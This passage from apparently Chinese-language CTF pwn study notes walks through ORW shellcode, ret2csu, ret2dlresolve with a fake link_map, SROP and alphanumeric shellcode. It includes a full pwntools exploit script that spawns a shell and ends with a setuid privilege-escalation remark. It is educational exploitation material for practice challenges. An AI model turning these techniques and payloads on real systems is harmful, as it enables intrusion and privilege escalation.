class="string">&#x27;/bin/sh&#x27;</span>, <span class="string">&#x27;utf-8&#x27;</span>)))</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">elf=ELF(<span class="string">&quot;./文件名&quot;</span>)</span><br><span class="line">puts_got=elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_plt=elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br></pre></td></tr></table></figure>

<p>本地的库可以在gdb调式中找到，远程的库直接链接就行</p>
<p>在一些程序中特别是静态的程序，他会将如main函数等主要的函数换一个看不出来特别的函数名，此时若要找到其主要函数的位置则可以通过在汇编中的start函数中的位置找到</p>
<p><img src="https://xuanxuanblingbling.github.io/assets/pic/317/start.png" alt="img"></p>
<p><strong>ORW</strong></p>
<p>关于有沙箱的题的禁用了system等直接获得shell的题目，通过mprotect函数和shellcode直接将flag打印在屏幕上，</p>
<p>在遇到这类题如果有canary保护，必须要通过之前的方法将canary绕过，这里将直接写payload的过程</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload=p64(pop_rdi_ret) + p64(bss_addr + <span class="number">0x500</span>) + p64(gets)</span><br><span class="line">    #构造mprotect，更改内存保护属性</span><br><span class="line">payload+=p64(pop_rdx_pop_r12_ret)+p64(<span class="number">7</span>)+p64(<span class="number">0</span>)#设置保护属性</span><br><span class="line">    <span class="comment">//这里只用将rdx改为7便可以，如果没有单独的rdx在加上其他寄存器</span></span><br><span class="line">payload += p64(pop_rsi_pop_r15_ret) + p64(<span class="number">0x1500</span>) + p64(<span class="number">0</span>)#设置大小</span><br><span class="line">payload += p64(pop_rdi_ret)     + p64((bss_addr&gt;&gt;<span class="number">12</span>)&lt;&lt;<span class="number">12</span>)#设置起始地址</span><br><span class="line">payload += p64(mprotect)#调用mprotect</span><br><span class="line">#修改内存保护属性后，令RIP指向下方构造的shellcode</span><br><span class="line">payload += p64(bss_addr + <span class="number">0x500</span>)</span><br></pre></td></tr></table></figure>

<p>对于上文中的pop ret指令如果能在程序中直接找的则最好，如果找不到则通过libc库中的指令运行，对于bss_addr + 0x500只要是bss段中的空地方都可以，mprotect的地址也需要在libc库中寻找，</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mprotect=libc.symbols[<span class="string">&#x27;mprotect&#x27;</span>]+libc</span><br></pre></td></tr></table></figure>

<p>将这段payload注入到程序中，之后便可以直接注入shellcode，关于shellcode可以直接使用库中能直接使用的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">context.arch =<span class="string">&quot;amd64&quot;</span></span><br><span class="line">payload  = shellcraft.open(<span class="string">&quot;flag&quot;</span>)</span><br><span class="line">#将远程flag文件内容写入缓冲区，open成功时返回值为<span class="number">3</span></span><br><span class="line"><span class="meta">#                          fd  address          size</span></span><br><span class="line">payload += shellcraft.read( <span class="number">3</span>, bss_addr+<span class="number">0x100</span>, <span class="number">0x30</span>)</span><br><span class="line">payload += shellcraft.write(<span class="number">1</span>, bss_addr+<span class="number">0x100</span>, <span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="keyword">asm</span>(payload))<span class="comment">//初始化后直接注入程序中</span></span><br></pre></td></tr></table></figure>

<p>在shellcode的构造中fd的值为固定值</p>
<p>address为程序中的空地址</p>
<p>size为读取的数据长度</p>
<p>这里讲关于ORW的另外一种使用payload构建指令集，然后调用三个不同的函数open，read，write（在有的题中的没有这个函数对与其他只要是能将东西打印在屏幕上的就行，如puts函数），</p>
<p><em>1，调用open函数打开flag文件</em></p>
<p>在程序的任意一个可读可写的区域如，bss段注入b’.&#x2F;flag\x00\x00’(满足8字节方便栈对其)</p>
<p>将存放b’.&#x2F;flag\x00\x00’的地址注入到寄存器rdi中，（作为open函数打开的文件名）</p>
<p>再将rsi和rbp中的值分别改为0和1，有时可能还需要将rdx中的值改为0</p>
<ul>
<li><code>rdi</code>：要打开的文件名的地址（”flag”的地址）</li>
<li><code>rsi</code>：打开文件的模式标志（通常是<code>O_RDONLY</code>，即0）</li>
<li><code>rdx</code>：额外的标志或权限（通常可以设置为0）</li>
</ul>
<p>在完成上面的一切后可以执行read函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload=b<span class="number">&#x27;.</span>/flag\x00\x00<span class="number">&#x27;</span></span><br><span class="line">payload+=p64(pop_rdi_ret)+p64(buf)<span class="comment">//为./flag\x00\x00的存放地址</span></span><br><span class="line">payload+=p64(pop_rsi_pop_r15_ret)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)<span class="comment">//在很多程序中不能找到之改变rsi的命令</span></span><br><span class="line">payload+=p64(pop_rbp_ret)+p64(<span class="number">1</span>)+p64(open_plt)</span><br></pre></td></tr></table></figure>

<p>在执行完上面的程序后如果能成功打开文件，对于程序来说回通过rax寄存器返回一个值，对于这个值如果为非负数（一般为4），这表示成功打开这个文件，如果是负数如0xffff则没有打开成功，这个数是文件描述符 fd，将在后边调用read函数作为其中一个参数传入</p>
<p><em>2，调用read将flag文件中内容读到程序中</em></p>
<p>在调用read函数之前要将这三个寄存器改为相应的值</p>
<ol>
<li><code>rdi</code>：设置为文件描述符，即指向已经打开的文件的文件描述符。便是在调用open函数最后通过rax寄存器返回的值（一般为4）</li>
<li><code>rsi</code>：设置为读取数据的缓冲区的地址。找一个可读可写的空地址bss段</li>
<li><code>rdx</code>：设置为要读取的字节数。</li>
<li>rbp：设置为1</li>
</ol>
<p>但是一般在程序中基本不能找到刚好改变这三的寄存器的命令</p>
<p>特别是在动态链接中最多能找到的是改变rdi和rsi的命令，在这里将之前的一种方法再次讲一遍利用__libc_csu_init函数中的两段命令，将一些没有直接修改寄存器的值改变，</p>
<p><img src="/2024/03/27/%E5%8D%9A%E5%AE%A2/image-20240312163842964-17115472617563.png" alt="image-20240312163842964"></p>
<p>一般在这个函数的最后这里都会有这两段命令，1，从0x400A3A到0x400A44的修改5个寄存器的值命令。2，从0x400A20到0x400A29的将r13,r14,r15d分别复制到rdx,rsi,edi(这里edi是rdi寄存器的后8位，一般来说对于rdi寄存器来说不会用到前8位，这样一般就可以了)，然后跳转到r12+rbx*8的地址。通过以上两段命令变刚好可将我们需要的三个寄存器的值改变，</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload=p64(pop_rbx_rbp_r12_r13_r14_r15_ret)+p64(<span class="number">0</span>)<span class="comment">//为了后面跳转不被影响</span></span><br><span class="line">payload+=p64(<span class="number">1</span>)+p64(read_got)<span class="comment">//修改rbp的值，r12为之后要跳转的函数，必须使用got表的地址不能用plt的</span></span><br><span class="line">paylaod+=p64(<span class="number">0</span>x要读取的长度)+p64(buf空的可写可读之地)+p64(<span class="number">4</span>rax的返回值)</span><br><span class="line">payload+p64(csu_init)+b<span class="number">&#x27;</span>A<span class="number">&#x27;</span>*<span class="number">0x38</span><span class="comment">//为了将使用这段指令所空出来的值补完便于执行后面需要的命令</span></span><br></pre></td></tr></table></figure>



<p>如此在将这几个寄存器的值修改后便会执行got表的地址运行read函数将文件中的内容读到程序中的设定地</p>
<p><em>3，调用puts函数将内容打印出</em></p>
<p>将之前read函数读取的内容存放之地址放在rdi寄存器中执行plt表的puts函数地址就行</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload+=p64(pop_rdi_ret)+p64(buf)+p64(puts_plt)</span><br></pre></td></tr></table></figure>





<p>至此便是通过orw的两方法将flag文件中的内容答应在屏幕上</p>
<p>栈溢出的本意便是通过栈溢出将程序的执行劫持，通过栈溢出将本该执行的栈上的程序通过栈溢出覆盖成自己要想执行命令，如果有的栈所限制的数据太少以至于，连栈迁移的长度都不够，便可以考虑通过栈溢出后将后面要执行的，命令的地址的后面改成其他有用的函数地址，特别是在有pie保护的题中所有的程序只有最后4为数值不同，便可以再栈溢出后加上要挑战的函数的地址的最后的不同的几位，在栈溢出后便会直接跳转到需要执行的函数，</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=b<span class="number">&#x27;</span>A<span class="number">&#x27;</span>*<span class="number">0x28</span>+b<span class="number">&#x27;</span>\x69<span class="number">&#x27;</span></span><br></pre></td></tr></table></figure>



<p>对于整数溢出来说，有一种向下溢出，在程序中如果有整数溢出的存在，但一个数被减成负数时在程序中并不会显示成负值反而会成为一个在允许范围内最大的数，0xffff，同理在一个数被加时，当加的超过范围反而会成为特别小的，0x0001，在做这类题时一定要把握不对那个数进行检查就加或减的地方，在这次加和减中将整数溢出成为需要的那个数</p>
<p><strong>纯手搓shellcode</strong></p>
<p>shellcode的本质就是通过syscall的执行调用不同的函数从而实现目的</p>
<p>对于不同的函数其系统的调用号不同，不同的系统调用号也能调用不同的函数，这个函数的系统调用号储存在rax寄存器中如，要通过syscall调用read，则在执行syscall这个命令之前要满足</p>
<p><strong>RAX &#x3D; 0<br>RDI &#x3D; 0<br>RSI &#x3D; 要写入的地址<br>RDX &#x3D; 很大的数</strong></p>
<p>相当于执行了read(RDI,RSI,RDX)，你就可以往RSI这个地方写很多数据，对于不同的函数的系统调用在下面这个中可以查到<a target="_blank" rel="noopener" href="https://blog.csdn.net/SUKI547/article/details/103315487">Linux系统调用表（64位）_系统调用号表-CSDN博客</a></p>
<p>再知道相应的函数的系统调用号以后便可以开始写汇编以满足相应的函数调用，如</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov rax, <span class="number">0</span></span><br><span class="line">mov rdi, <span class="number">0</span></span><br><span class="line">mov rsi, <span class="number">0x88888888</span></span><br><span class="line">mov rdi, <span class="number">0x100</span></span><br><span class="line">syscall    </span><br></pre></td></tr></table></figure>

<p>当程序能执行以上的指令后便可以调用read函数向0x88888888的地方读取0x100的数据，</p>
<p>对于写好的汇编指令要注入到程序中必须换为机器码才能注入到程序中，可以通过以下的网站换为机器码</p>
<p>[Online Assembler and Disassembler (shell-storm.org)](<a target="_blank" rel="noopener" href="https://shell-storm.org/online/Online-Assembler-and-Disassembler/?inst=">https://shell-storm.org/online/Online-Assembler-and-Disassembler/?inst=</a> &amp;arch&#x3D;x86-64&amp;as_format&#x3D;inline#assembly)</p>
<p><img src="/2024/03/27/%E5%8D%9A%E5%AE%A2/%E5%8D%9A%E5%AE%A2%5Cimage-20240317085245419.png" alt="image-20240317085245419"></p>
<p>对于已知机器码要想换为ascll可以通过以下网站实现</p>
<p><a target="_blank" rel="noopener" href="https://www.bchrt.com/tools/ascii-converter/">ASCII、十六进制、二进制、十进制、Base64转换器 (bchrt.com)</a></p>
<p>但是在很多情况下我们要注入的shellcode是有限制的，有的时候只能输入规定的值如大写字母和数字，像这种情况变要将写的shellcode从16进制的数转为为ascll码的值，如在ascll中A代表41，那么当我们向程序输入A，在程序内部便会存放41如果程序在能执行到这时，便回将那个41当成机器码执行，在ascll码中不同的数相对应的汇编可以在以下的网站中找到</p>
<p><a target="_blank" rel="noopener" href="https://nets.ec/Alphanumeric_shellcode">Alphanumeric shellcode - NetSec</a></p>
<p>对于限制输入的时候可以通过异或的操作将输入的数转换为需要的数，这里给一个异或的py脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_operation_case1</span>():</span><br><span class="line">    original_num = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入原数（16进制）：&quot;</span>), <span class="number">16</span>)</span><br><span class="line">    xor_num = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入要对原数进行异或的数（16进制）：&quot;</span>), <span class="number">16</span>)</span><br><span class="line">    </span><br><span class="line">    result = original_num ^ xor_num</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;异或的结果：&quot;</span>, <span class="built_in">hex</span>(result))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;原数的二进制表示：&quot;</span>, <span class="built_in">bin</span>(original_num))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;对原数进行异或的数的二进制表示：&quot;</span>, <span class="built_in">bin</span>(xor_num))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;异或的结果的二进制表示：&quot;</span>, <span class="built_in">bin</span>(result))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_operation_case2</span>():</span><br><span class="line">    original_num = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入原数（16进制）：&quot;</span>), <span class="number">16</span>)</span><br><span class="line">    xor_result = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入异或的结果（16进制）：&quot;</span>), <span class="number">16</span>)</span><br><span class="line">    </span><br><span class="line">    xor_num = original_num ^ xor_result</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;对原数进行异或的数：&quot;</span>, <span class="built_in">hex</span>(xor_num))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;原数的二进制表示：&quot;</span>, <span class="built_in">bin</span>(original_num))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;对原数进行异或的数的二进制表示：&quot;</span>, <span class="built_in">bin</span>(xor_num))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;异或的结果的二进制表示：&quot;</span>, <span class="built_in">bin</span>(xor_result))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    choice = <span class="built_in">input</span>(<span class="string">&quot;请选择操作：\n1. 知道原数和要对原数进行异或的数求异或的结果；\n2. 知道异或的结果和原数求要对原数进行异或的数（输入1或2）；\n输入 &#x27;exit&#x27; 退出：\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> choice == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">        xor_operation_case1()</span><br><span class="line">    <span class="keyword">elif</span> choice == <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">        xor_operation_case2()</span><br><span class="line">    <span class="keyword">elif</span> choice.lower() == <span class="string">&#x27;exit&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;程序已退出。&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;无效的选择。&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<p><strong>ret2dlresolve类题</strong></p>
<p>关于这类题目现将一般做题方法写下来，具体的原理等看看视频在回来补</p>
<p>须知道read函数的plt和got的地址</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">eof = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">read_plt = eof.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_got = eof.got[<span class="string">&#x27;read&#x27;</span>]</span><br></pre></td></tr></table></figure>

<p>plt表的头地址和这个地址+7或其它的数</p>
<p>bss段的空地址，这个空地址可能需要两个</p>
<p>rdi和rsi寄存器的修改地(如果只修改rsi的没有同时修改rsi和r15的也行，r15一直被修改为0就行)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">plt0=<span class="number">0x401020</span></span><br><span class="line">plt_load =p64(plt0+<span class="number">7</span>)</span><br><span class="line">bss=<span class="number">0x404040</span>    </span><br><span class="line">bss_stage =bss + <span class="number">0x100</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x88888888</span>    </span><br><span class="line">pop_rsi_ret=<span class="number">0x88888888</span></span><br></pre></td></tr></table></figure>

<p>还需知道在基本库中函数system和read的地址以及他们两个的差值</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">libc = ELF(<span class="string">&#x27;/usr/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">system_libc=libc.sym[<span class="string">&#x27;system&#x27;</span>]    </span><br><span class="line">read_libc=libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">l_addr =libc.sym[<span class="string">&#x27;system&#x27;</span>] -libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br></pre></td></tr></table></figure>

<p>在此之后便可以开始构建其中最重要的基本过程，可以通过以下函数直接构成</p>
<p>其中的第一个需要输入的参数fake_linkmap_add，便是之前找的bss段的空地址，但最好用第二，第一个需要在之后用于存放这一段命令，bss_stage</p>
<p>第二个参数known_func_ptr，便是已知的程序中的read函数的got表的地址，read_got</p>
<p>第三个参数offset，便是库函数中system和read的地址以及他们两个的差值，l_addr</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">fake_Linkmap_payload</span>(<span class="params">fake_linkmap_addr,known_func_ptr,offset</span>):</span><br><span class="line">	linkmap = p64(offset &amp; (<span class="number">2</span> ** <span class="number">64</span> - <span class="number">1</span>))<span class="comment">#l_addr</span></span><br><span class="line">	linkmap += p64(<span class="number">0</span>)</span><br><span class="line">	linkmap += p64(fake_linkmap_addr + <span class="number">0x18</span>)</span><br><span class="line">	linkmap += p64((fake_linkmap_addr + <span class="number">0x30</span> - offset) &amp; (<span class="number">2</span> ** <span class="number">64</span> - <span class="number">1</span>))</span><br><span class="line">	linkmap += p64(<span class="number">0x7</span>)</span><br><span class="line">	linkmap += p64(<span class="number">0</span>)</span><br><span class="line">	linkmap += p64(<span class="number">0</span>)</span><br><span class="line">	linkmap += p64(<span class="number">0</span>)</span><br><span class="line">	linkmap += p64(known_func_ptr - <span class="number">0x8</span>)</span><br><span class="line">	linkmap += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">	linkmap = linkmap.ljust(<span class="number">0x68</span>,<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">	linkmap += p64(fake_linkmap_addr)</span><br><span class="line">	linkmap += p64(fake_linkmap_addr + <span class="number">0x38</span>)</span><br><span class="line">	linkmap = linkmap.ljust(<span class="number">0xf8</span>,<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">	linkmap += p64(fake_linkmap_addr + <span class="number">0x8</span>)</span><br><span class="line">	<span class="keyword">return</span> linkmap</span><br></pre></td></tr></table></figure>

<p>现在便可以开始构建基本payload，和必要过程</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fake_link_map = fake_Linkmap_payload(bss_stage, read_got ,l_addr)</span><br><span class="line">    </span><br><span class="line">payload = flat( b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>*(栈溢出的垃圾值，rbp+<span class="number">8</span>) ,</span><br><span class="line">               pop_rdi, <span class="number">0</span> ,pop_rsi ,bss_stage ,read_plt<span class="comment">//调用read函数将fake_link_map写入bss</span></span><br><span class="line">			    ,pop_rsi ,<span class="number">0</span> ,pop_rdi ,bss_stage +<span class="number">0x48</span> ,plt_load ,bss_stage ,<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>之后便可以直接发个程序了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p.sendline(payload)</span><br><span class="line">p.send(fake_link_map)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>综合</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span>, arch = <span class="string">&quot;amd64&quot;</span>, log_level= <span class="string">&quot;debug&quot;</span>)</span><br><span class="line"> </span><br><span class="line">p=process(<span class="string">&#x27;./pwn3&#x27;</span>)</span><br><span class="line"><span class="comment">#p =remote(&#x27;node4.buuoj.cn&#x27;,27108)</span></span><br><span class="line">eof = ELF(<span class="string">&#x27;./pwn3&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/usr/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">read_plt = eof.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_got = eof.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"><span class="comment">#vuln_addr = 0x401170</span></span><br><span class="line">plt0 = <span class="number">0x401020</span> <span class="comment">#plt段地址 </span></span><br><span class="line">bss = <span class="number">0x404040</span></span><br><span class="line">bss_stage =bss + <span class="number">0x00</span></span><br><span class="line">l_addr =libc.sym[<span class="string">&#x27;system&#x27;</span>] -libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"> </span><br><span class="line">pop_rdi = <span class="number">0x000000000040115e</span>    <span class="comment">#pop rdi ; ret</span></span><br><span class="line">pop_rsi = <span class="number">0x0000000000401231</span>    <span class="comment">#pop rsi ; ret#用于解析符号 dl_runtime_resolve  </span></span><br><span class="line">plt_load =p64(plt0+<span class="number">7</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fake_Linkmap_payload</span>(<span class="params">fake_linkmap_addr,known_func_ptr,offset</span>):</span><br><span class="line">	linkmap = p64(offset &amp; (<span class="number">2</span> ** <span class="number">64</span> - <span class="number">1</span>))<span class="comment">#l_addr</span></span><br><span class="line">	linkmap += p64(<span class="number">0</span>)</span><br><span class="line">	linkmap += p64(fake_linkmap_addr + <span class="number">0x18</span>)</span><br><span class="line">	linkmap += p64((fake_linkmap_addr + <span class="number">0x30</span> - offset) &amp; (<span class="number">2</span> ** <span class="number">64</span> - <span class="number">1</span>))</span><br><span class="line">	linkmap += p64(<span class="number">0x7</span>)</span><br><span class="line">	linkmap += p64(<span class="number">0</span>)</span><br><span class="line">	linkmap += p64(<span class="number">0</span>)</span><br><span class="line">	linkmap += p64(<span class="number">0</span>)</span><br><span class="line">	linkmap += p64(known_func_ptr - <span class="number">0x8</span>)</span><br><span class="line">	linkmap += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">	linkmap = linkmap.ljust(<span class="number">0x68</span>,<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">	linkmap += p64(fake_linkmap_addr)</span><br><span class="line">	linkmap += p64(fake_linkmap_addr + <span class="number">0x38</span>)</span><br><span class="line">	linkmap = linkmap.ljust(<span class="number">0xf8</span>,<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">	linkmap += p64(fake_linkmap_addr + <span class="number">0x8</span>)</span><br><span class="line">	<span class="keyword">return</span> linkmap</span><br><span class="line"> </span><br><span class="line">fake_link_map = fake_Linkmap_payload(bss_stage, read_got ,l_addr)</span><br><span class="line"> </span><br><span class="line">payload = flat( <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x78</span> ,pop_rdi, <span class="number">0</span> ,pop_rsi ,bss_stage ,<span class="number">0</span>,read_plt</span><br><span class="line">			    ,pop_rsi ,<span class="number">0</span> ,<span class="number">0</span>,pop_rdi ,bss_stage +<span class="number">0x48</span> ,plt_load ,bss_stage ,<span class="number">0</span>)</span><br><span class="line"> </span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.send(fake_link_map)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>





<p><strong>SROP</strong></p>
<p>对于这种题一般有比较明显的特点，必然有通过syscall进行函数调用的地方而不是直接调用函数，</p>
<p>对于像这种不用进行栈迁移的，在程序中有syscall函数调用的</p>
<p>在一开始必须知道得有，rdi寄存器修改，bss段的空地址，plt段的syscall函数地址</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pop_rdi_ret=<span class="number">0x88888888</span></span><br><span class="line">bss=<span class="number">0x404040</span></span><br><span class="line">sysacll=<span class="number">0x8888888</span>    </span><br></pre></td></tr></table></figure>

<p>对于srop的基本构造可以直接使用现成的工具构造，</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">frame=SigreturnFrame()</span><br><span class="line">frame.rdi =<span class="number">59</span></span><br><span class="line">frame.rsi =bss <span class="number">-0x30</span></span><br><span class="line">frame.rdx =<span class="number">0</span></span><br><span class="line">frame.rcx =<span class="number">0</span></span><br><span class="line">frame.rsp =bss</span><br><span class="line">frame.rip =syscall<span class="comment">//syscall在plt的地址</span></span><br></pre></td></tr></table></figure>

<p>现在便可以开始构建payload，我们要分两次进行输入</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload=b<span class="number">&#x27;</span>A<span class="number">&#x27;</span>*(到rbp的距离)+p64(bss)+p64(能进行输入的函数的开始，以便第二段的输入)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;srop!\n&#x27;</span>,payload)</span><br><span class="line">    </span><br><span class="line">payload=b<span class="number">&#x27;</span>/bin/sh\x00<span class="number">&#x27;</span>+b<span class="number">&#x27;</span>A<span class="number">&#x27;</span>*（到rbp的距离）</span><br><span class="line">payload+=p64(pop_rdi_ret)+p64(<span class="number">15</span>)+p64(syscall)+flat(frame)<span class="comment">//将srop的基本参数输入</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"> </span><br></pre></td></tr></table></figure>



<p>在通过脚本拿到shell后发现flag不能读出来，发现pwn文件有s级权限，便可以可以用setuid函数执行0，从而获得权限读取flag，</p>
